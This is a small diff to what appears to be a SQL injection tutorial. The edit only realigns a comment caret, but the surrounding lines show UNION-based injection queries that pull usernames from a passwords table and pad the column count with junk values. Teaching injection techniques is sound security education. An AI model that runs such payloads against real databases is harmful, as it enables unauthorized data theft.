@@ -99,7 +99,7 @@ For advanced injection, We can use 'NULL' as 'NULL' fits all data types
 Assuming: The products table has 2 column, and we only want to retrieve username from the passwords table:
 ```sql
 SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords;
-#                                                                     ^ injected junk
+#                                                                    ^ injected junk
 # If the products table had more than 2 columns, like 3 or 4 columns, we would have to add more junk
 SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords -- ';
 #                                                                    ^  ^  ^ Injected junk
